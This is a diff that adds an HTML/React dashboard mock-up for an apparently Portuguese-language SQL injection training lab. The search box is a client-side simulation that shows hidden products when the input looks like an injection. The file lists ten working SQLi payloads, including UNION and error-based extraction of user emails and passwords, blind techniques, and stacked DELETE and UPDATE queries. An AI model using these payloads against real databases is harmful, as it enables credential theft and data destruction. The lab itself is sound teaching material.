@@ -1,0 +1,166 @@
+<!-- @dsCard group="SQLi Lab" viewport="1100x700" name="SQLi Dashboard v2" subtitle="Lucide icons, muted purple, professional header" -->
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>SQL Injection — Dashboard</title>
+  <link rel="stylesheet" href="../../styles.css">
+  <script src="https://unpkg.com/react@18.3.1/umd/react.development.js" integrity="sha384-hD6/rw4ppMLGNu3tX5cjIb+uRZ7UkRJ6BPkLpg4hAu/6onKUg4lLsHAs9EBPT82L" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/react-dom@18.3.1/umd/react-dom.development.js" integrity="sha384-u6aeetuaXnQ38mYT8rp6sbXaQe3NL9t+IBXmnYxwkUI2Hw4bsp2Wvmx4yRQF1uAm" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@babel/standalone@7.29.0/babel.min.js" integrity="sha384-m08KidiNqLdpJqLq95G/LEi8Qvjl/xUYll3QILypMoQ65QorJ9Lvtp2RXYGBFj1y" crossorigin="anonymous"></script>
+  <style>* { box-sizing: border-box; margin: 0; padding: 0; } body { height:100vh; overflow:hidden; }</style>
+</head>
+<body style="font-family:'IBM Plex Sans',system-ui,sans-serif;">
+<div id="root" style="height:100vh;display:flex;flex-direction:column;"></div>
+<script type="text/babel">
+const ACC = '#4F66D4';
+const IP={
+  'alert-triangle':`<path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/>`,
+  'arrow-left':`<path d="m12 19-7-7 7-7"/><path d="M19 12H5"/>`,
+  'arrow-up-down':`<path d="m21 16-4 4-4-4"/><path d="M17 20V4"/><path d="m3 8 4-4 4 4"/><path d="M7 4v16"/>`,
+  clock:`<circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>`,
+  database:`<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5v14a9 3 0 0 0 18 0V5"/><path d="M3 12a9 3 0 0 0 18 0"/>`,
+  edit:`<path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>`,
+  eye:`<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`,
+  'git-merge':`<circle cx="18" cy="18" r="3"/><circle cx="6" cy="6" r="3"/><path d="M6 21V9a9 9 0 0 0 9 9"/>`,
+  hash:`<line x1="4" x2="20" y1="9" y2="9"/><line x1="4" x2="20" y1="15" y2="15"/><line x1="10" x2="8" y1="3" y2="21"/><line x1="16" x2="14" y1="3" y2="21"/>`,
+  layers:`<path d="m12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83Z"/><path d="m22 17.65-9.17 4.16a2 2 0 0 1-1.66 0L2 17.65"/><path d="m22 12.65-9.17 4.16a2 2 0 0 1-1.66 0L2 12.65"/>`,
+  search:`<circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>`,
+  shield:`<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>`,
+  'trash-2':`<path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/><line x1="10" x2="10" y1="11" y2="17"/><line x1="14" x2="14" y1="11" y2="17"/>`,
+};
+function Ic({n,s=18,c='currentColor',w=1.75}) {
+  const svg=`<svg xmlns="http://www.w3.org/2000/svg" width="${s}" height="${s}" viewBox="0 0 24 24" fill="none" stroke="${c}" stroke-width="${w}" stroke-linecap="round" stroke-linejoin="round">${IP[n]||''}</svg>`;
+  return <img src={`data:image/svg+xml;charset=utf-8,${encodeURIComponent(svg)}`} width={s} height={s} alt="" style={{display:'inline-block',flexShrink:0,verticalAlign:'middle'}} />;
+}
+
+const TESTS=[
+  {id:1,icon:'alert-triangle',name:'Error-based Injection',   payload:`' AND 1=CAST((SELECT string_agg(email||':'||senha,', ') FROM usuarios) AS INT)--`,desc:'Vaza dados pela mensagem de erro do banco'},
+  {id:2,icon:'git-merge',    name:'UNION SELECT',             payload:`' UNION SELECT id, email || ':' || senha, 0, false FROM usuarios--`,              desc:'Extrai dados de outra tabela'},
+  {id:3,icon:'arrow-up-down',name:'ORDER BY — Enumeração',   payload:`' ORDER BY 4--`,                                                                    desc:'Descobre o número de colunas'},
+  {id:4,icon:'hash',         name:'Comentários SQL',          payload:`%' OR oculto=true--`,                                                              desc:'Ignora o resto do filtro WHERE'},
+  {id:5,icon:'layers',       name:'Stacked Queries',          payload:`'; DELETE FROM produtos WHERE oculto=true;--`,                                     desc:'Executa múltiplas queries', destrutivo:true},
+  {id:6,icon:'clock',        name:'Time-based Blind',         payload:`' AND 1=(SELECT 1 FROM pg_sleep(3))--`,                                            desc:'Infere dados pelo tempo de resposta'},
+  {id:7,icon:'eye',          name:'Boolean Blind',            payload:`' AND 1=1--`,                                                                      desc:'Condição verdadeira anula o filtro'},
+  {id:8,icon:'trash-2',      name:'DELETE Injection',         payload:`'; DELETE FROM produtos WHERE id>0;--`,                                            desc:'Deleta registros da tabela', destrutivo:true},
+  {id:9,icon:'edit',         name:'UPDATE Injection',         payload:`'; UPDATE produtos SET preco=0;--`,                                                desc:'Modifica dados da tabela', destrutivo:true},
+  {id:10,icon:'search',      name:'Information Schema',       payload:`' UNION SELECT 1, table_name || '.' || column_name, 1, false FROM information_schema.columns WHERE table_schema='public'--`, desc:'Mapeia a estrutura do banco'},
+];
+
+const PRODS_V=[
+  {nome:'Curso de QA Manual: Da Teoria ao Primeiro Bug',preco:'197.00',oculto:false},
+  {nome:'Curso de Automação com Cypress (Do Zero ao Pipeline)',preco:'297.00',oculto:false},
+  {nome:'Caneca de Porcelana: "Roda na Minha Máquina"',preco:'39.90',oculto:false},
+  {nome:'Mouse Gamer Ergonômico com RGB',preco:'159.90',oculto:false},
+  {nome:'Teclado Mecânico Switch Blue',preco:'249.90',oculto:false},
+  {nome:'E-book: 101 Desculpas Padrão para Quando o Sistema Cai',preco:'19.90',oculto:false},
+  {nome:'Licença Anual Individual — IntelliJ IDEA Pro',preco:'349.00',oculto:false},
+  {nome:'Monitor Ultrawide 34 Pol',preco:'1899.00',oculto:false},
+  {nome:'Livro Físico: Clean Code',preco:'99.90',oculto:false},
+  {nome:'Curso Avançado: Engenharia de Prompt',preco:'397.00',oculto:false},
+];
+const PRODS_O=[
+  {nome:'Gabarito Oficial da Prova de Engenharia de Software',preco:'999.00',oculto:true},
+  {nome:'Acesso de Administrador Root no Servidor de Produção',preco:'9999.00',oculto:true},
+  {nome:'Planilha com todos os salários da diretoria',preco:'4999.00',oculto:true},
+  {nome:'Backup Completo do Banco de Dados de Produção (50GB)',preco:'14999.00',oculto:true},
+  {nome:'Produto Secreto',preco:'1999.00',oculto:true},
+];
+
+function Item({t,active,onToggle}) {
+  const isD = t.destrutivo;
+  return (
+    <div>
+      <div onClick={onToggle} style={{ display:'flex', alignItems:'flex-start', gap:10, padding:'10px 12px', borderRadius:8, cursor:'pointer', background: active ? ACC+'18' : 'transparent', border: active ? `1.5px solid ${ACC}35` : '1.5px solid transparent', marginBottom:3, transition:'all 0.12s' }}>
+        <div style={{ marginTop:1 }}><Ic n={t.icon} s={15} c={active ? ACC : '#64748B'} /></div>
+        <div>
+          <div style={{ fontSize:12, fontWeight:600, color: active ? ACC : '#334155', lineHeight:1.3 }}>{t.name}</div>
+          <div style={{ fontSize:11, color:'#94A3B8', marginTop:2, lineHeight:1.4 }}>{t.desc}</div>
+        </div>
+      </div>
+      {active && (
+        <div style={{ background: ACC+'0A', borderLeft:`3px solid ${ACC}`, padding:'10px 12px', marginBottom:4, borderRadius:'0 6px 6px 0', marginLeft:4 }}>
+          {isD && <div style={{ background:'#FEF2F2', border:'1px solid #FECACA', borderRadius:6, padding:'6px 8px', marginBottom:8, fontSize:11, color:'#DC2626', lineHeight:1.4 }}><strong>Atenção:</strong> Altera dados para todos os alunos. Reset após testar.</div>}
+          <div style={{ fontSize:11, color:'#64748B', fontWeight:600, marginBottom:4 }}>Payload:</div>
+          <code style={{ display:'block', background:'#fff', padding:'7px 10px', borderRadius:6, border:`1px solid ${ACC}40`, fontFamily:"'IBM Plex Mono',monospace", fontSize:10, wordBreak:'break-all', color:'#334155', lineHeight:1.5 }}>{t.payload}</code>
+          <div style={{ fontSize:10, color:'#94A3B8', marginTop:6 }}>Cole no campo de busca ao lado →</div>
+        </div>
+      )}
+    </div>
+  );
+}
+
+function Dashboard() {
+  const [active,setActive] = React.useState(null);
+  const [busca,setBusca]   = React.useState('');
+  const [injected,setInjected] = React.useState(false);
+  const toggle = id => setActive(p => p===id?null:id);
+  const looksLike = v => v.includes("'") || /\bor\b/i.test(v) || v.includes('--') || v.includes('union');
+  const search = () => { if(looksLike(busca)){setInjected(true);}else{setInjected(false);} };
+  const reset = () => { setActive(null); setBusca(''); setInjected(false); };
+  const prods = injected ? [...PRODS_V,...PRODS_O] : PRODS_V.filter(p => busca===''||p.nome.toLowerCase().includes(busca.toLowerCase()));
+
+  return (
+    <div style={{ display:'flex', flexDirection:'column', height:'100vh' }}>
+      {/* Header */}
+      <header style={{ background:'#fff', borderBottom:'1px solid #E2E8F0', padding:'11px 24px', display:'flex', alignItems:'center', justifyContent:'space-between', flexShrink:0 }}>
+        <div style={{ display:'flex', alignItems:'center', gap:12 }}>
+          <a href="../lab_hub/index.html" style={{ display:'flex', alignItems:'center', gap:5, color:'#64748B', textDecoration:'none', fontSize:12, fontWeight:500 }}>
+            <Ic n="arrow-left" s={13} c="#64748B" /> Laboratórios
+          </a>
+          <span style={{ color:'#E2E8F0', padding:'0 2px' }}>|</span>
+          <div style={{ display:'flex', alignItems:'center', gap:7 }}>
+            <div style={{ width:26, height:26, background: ACC+'18', borderRadius:6, display:'flex', alignItems:'center', justifyContent:'center' }}><Ic n="database" s={14} c={ACC} /></div>
+            <span style={{ fontSize:13, fontWeight:700, color:'#0F172A' }}>SQL Injection</span>
+          </div>
+        </div>
+        <div style={{ display:'flex', alignItems:'center', gap:6 }}><Ic n="shield" s={15} c="#4F66D4" /><span style={{ fontSize:11, color:'#64748B' }}>Curso de Testes de Segurança</span></div>
+      </header>
+
+      <div style={{ display:'flex', flex:1, overflow:'hidden' }}>
+        {/* Sidebar */}
+        <div style={{ width:260, background:'#F8FAFC', borderRight:'1px solid #E2E8F0', padding:'16px 12px', overflowY:'auto', flexShrink:0 }}>
+          <div style={{ fontSize:11, fontWeight:700, color:'#94A3B8', letterSpacing:'0.07em', textTransform:'uppercase', marginBottom:10, paddingLeft:4 }}>10 Testes</div>
+          {TESTS.map(t=><Item key={t.id} t={t} active={active===t.id} onToggle={()=>toggle(t.id)} />)}
+          <div style={{ marginTop:12, borderTop:'1px solid #E2E8F0', paddingTop:12, display:'flex', flexDirection:'column', gap:6 }}>
+            <button onClick={reset} style={{ width:'100%', padding:'9px', background:'#C97428', color:'#fff', border:'none', borderRadius:7, fontSize:12, fontWeight:600, cursor:'pointer', fontFamily:'inherit' }}>Resetar dados do laboratório</button>
+            <a href="./login.html" style={{ display:'block', textAlign:'center', padding:'9px', background:'#EF4444', color:'#fff', textDecoration:'none', borderRadius:7, fontSize:12, fontWeight:600 }}>Sair</a>
+          </div>
+        </div>
+
+        {/* Main */}
+        <div style={{ flex:1, padding:24, overflowY:'auto', background:'#fff' }}>
+          <h1 style={{ fontSize:20, fontWeight:700, color:'#0F172A', marginBottom:16 }}>Loja de Produtos</h1>
+          {injected && <div style={{ background:'#DCFCE7', border:'1px solid #BBF7D0', borderRadius:8, padding:'10px 14px', marginBottom:14, fontSize:12, color:'#15803D', fontWeight:600 }}>Injeção bem-sucedida — {PRODS_V.length + PRODS_O.length} registros retornados, incluindo {PRODS_O.length} produtos ocultos.</div>}
+          <div style={{ display:'flex', gap:10, marginBottom:16 }}>
+            <input value={busca} onChange={e=>{setBusca(e.target.value);setInjected(false);}} onKeyDown={e=>e.key==='Enter'&&search()} placeholder="Buscar produtos — ou inserir payload SQLi…" style={{ flex:1, padding:'10px 14px', border:'1.5px solid', borderColor: looksLike(busca)&&busca?'#F59E0B':'#E2E8F0', borderRadius:8, fontSize:13, fontFamily:'inherit', outline:'none', background: looksLike(busca)&&busca?'#FFFBEB':'#fff' }} />
+            <button onClick={search} style={{ padding:'10px 18px', background:'#2D8F52', color:'#fff', border:'none', borderRadius:8, fontSize:13, fontWeight:600, cursor:'pointer', fontFamily:'inherit', whiteSpace:'nowrap' }}>Buscar</button>
+          </div>
+          <table style={{ width:'100%', borderCollapse:'collapse' }}>
+            <thead><tr style={{ background:'#F8FAFC', borderBottom:'2px solid #E2E8F0' }}>
+              {['Produto','Preço','Status'].map(h=><th key={h} style={{ padding:'10px 12px', textAlign:'left', fontSize:12, fontWeight:600, color:'#64748B', letterSpacing:'0.03em' }}>{h}</th>)}
+            </tr></thead>
+            <tbody>
+              {prods.length===0 ? <tr><td colSpan={3} style={{ padding:20, textAlign:'center', color:'#94A3B8', fontSize:13 }}>Nenhum resultado.</td></tr>
+              : prods.map((p,i)=>(
+                <tr key={i} style={{ background: p.oculto?'#FFFBEB':'#fff', borderBottom:'1px solid #F1F5F9' }}>
+                  <td style={{ padding:'10px 12px', fontSize:13, color:'#1E293B', fontWeight: p.oculto?600:400 }}>{p.nome}</td>
+                  <td style={{ padding:'10px 12px', fontSize:13, color:'#334155', whiteSpace:'nowrap' }}>R$ {p.preco}</td>
+                  <td style={{ padding:'10px 12px' }}>
+                    {p.oculto ? <span style={{ fontSize:11, fontWeight:600, color:'#DC2626', background:'#FEF2F2', padding:'2px 8px', borderRadius:999 }}>Oculto</span>
+                    : <span style={{ fontSize:11, fontWeight:600, color:'#16A34A', background:'#DCFCE7', padding:'2px 8px', borderRadius:999 }}>Visível</span>}
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+ReactDOM.createRoot(document.getElementById('root')).render(<Dashboard />);
+</script>
+</body>
+</html>
